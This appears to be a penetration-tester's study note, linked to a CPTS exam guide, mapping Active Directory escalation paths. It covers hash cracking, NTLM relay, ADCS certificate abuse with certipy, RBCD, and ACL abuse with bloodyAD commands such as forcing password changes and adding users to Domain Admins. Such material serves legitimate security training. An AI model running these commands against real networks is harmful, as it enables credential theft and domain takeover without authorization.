---
tags: [ade, attack-paths, escalation, methodology]
---

# Attack Paths

Common escalation routes from ADE findings.

## From AS-REP Hashes

```
[[asrep_hashes.txt]] → crack → plaintext creds
```

1. If password cracked: use as initial access
2. If account has elevated privileges (BloodHound check): direct escalation
3. If account is roastable: use for no-auth [[kerberoast_hashes.txt|Kerberoasting]]

## From Kerberoast Hashes

```
[[kerberoast_hashes.txt]] → crack → service account creds
```

1. Crack TGS hash → service account password
2. Check service account group membership (BloodHound)
3. If Domain Admin → done
4. If not → silver ticket attack, lateral movement

## From SMB Signing

```
[[smb-signing]] → Disabled → Relay Attack
```

1. SMB signing disabled → NTLM relay viable
2. Start Responder: `sudo responder -I tun0`
3. Start ntlmrelayx: `ntlmrelayx.py -tf targets.txt -smb2support`
4. Coerce authentication (PrinterBug, PetitPotam)

## From ADCS (Certipy)

```
[[adcs]] → ESC1 → certipy req → certipy auth → NT hash
```

### ESC1
```bash
certipy req -u user -p pass -dc-ip <dc> \
  -ca <CA> -template <Template> \
  -upn administrator@domain -target <fqdn>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

### ESC8 (Web Enrollment + No Signing)
```bash
# Requires SMB signing disabled!
certipy relay -ca <CA> -template <Template>
```

## From BloodHound

```
[[bloodhound]] → ZIP import → Attack Path Analysis
```

Top queries:
1. **Shortest Path to Domain Admins**
2. **Kerberoastable users** — cross-reference with high-value group membership
3. **AS-REP roastable users** — accounts with no pre-auth
4. **ACL abuse** — GenericAll, WriteDacl, ForceChangePassword
5. **Sessions** — where do admins have active sessions?
6. **AdminTo** — which machines can you pivot through?

## From MachineAccountQuota

```
[[maq]] > 0 → impacket-addcomputer → RBCD
```

1. Create computer: `impacket-addcomputer`
2. Configure RBCD from target to your computer
3. Impersonate high-value user to the target

## From Writable Objects

```
[[bloodyad]] → writable user/group/computer → ACL abuse
```

### Writable User
```bash
# Force change password
bloodyAD --host <fqdn> -d <domain> -u <user> -p <pass> \
  set password <target_user> 'NewPass123!'

# Or: targeted Kerberoasting
# Set SPN on user → Kerberoast → crack → plaintext
```

### Writable Group
```bash
bloodyAD --host <fqdn> -d <domain> -u <user> -p <pass> \
  add groupMember "Domain Admins" <user>
```

## Related

- [[CPTS Exam Guide]] — applying these in the exam
- [[Workflows]] — module execution order
- [[ADE]] — back to hub
